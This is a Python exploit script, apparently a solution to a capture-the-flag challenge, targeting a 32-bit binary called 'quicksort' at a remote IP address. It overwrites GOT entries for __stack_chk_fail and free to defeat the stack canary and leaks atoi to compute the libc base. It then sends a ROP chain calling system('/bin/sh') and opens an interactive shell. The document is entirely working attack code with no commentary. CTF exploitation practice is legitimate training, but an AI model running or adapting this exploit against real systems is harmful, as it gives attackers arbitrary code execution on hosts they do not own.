from ptrlib import *

elf = ELF("./quicksort")
#libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
#sock = Socket("localhost", 10000)
libc = ELF("./libc.so.6")
sock = Socket("34.92.96.238", 10000)

#_ = input()

rop_ret = 0x080484ae
rop_pop_ebx = 0x080484c5
addr_main = 0x8048816
plt_puts = 0x08048560

## Stage 1
sock.recvline()
sock.sendline("2")

# overwrite __stack_chk_fail
payload = str2bytes(str(rop_ret)) + b"\x00"
payload += b'A' * (0x10 - len(payload))
payload += p32(2) # n
payload += p32(0) # i
payload += p32(0) # j
payload += p32(elf.got("__stack_chk_fail")) # array
sock.recvuntil(":")
sock.sendline(payload)

# overwrite free
payload = str2bytes(str(rop_ret)) + b"\x00"
payload += b'A' * (0x10 - len(payload))
payload += p32(0) # n
payload += p32(0) # i
payload += p32(0) # j
payload += p32(elf.got("free")) # array
payload += p32(0) # canary
payload += p32(1) # pushed ebx
payload += p32(0)
payload += p32(0) # saved ebp
payload += p32(plt_puts)
payload += p32(rop_pop_ebx)
payload += p32(elf.got("atoi"))
payload += p32(addr_main)
sock.recvuntil(":")
sock.sendline(payload)

# leak libc base
sock.recvline()
sock.recvline()
addr_atoi = (u32(sock.recvline().rstrip()))
libc_base = addr_atoi - libc.symbol("atoi") 
dump("libc base = " + hex(libc_base))

addr_system = libc_base + libc.symbol("system")
addr_binsh = libc_base + next(libc.find("/bin/sh"))

## Stage 2
sock.recvline()
sock.sendline("1")

# get the shell!
payload = str2bytes(str(rop_ret)) + b"\x00"
payload += b'A' * (0x10 - len(payload))
payload += p32(1) # n
payload += p32(0) # i
payload += p32(0) # j
payload += p32(elf.section(".bss")) # array
payload += p32(0) # canary
payload += p32(1) # pushed ebx
payload += p32(0)
payload += p32(0) # saved ebp
payload += p32(addr_system)
payload += p32(0xffffffff)
payload += p32(addr_binsh)
sock.recvuntil(":")
sock.sendline(payload)

sock.interactive()
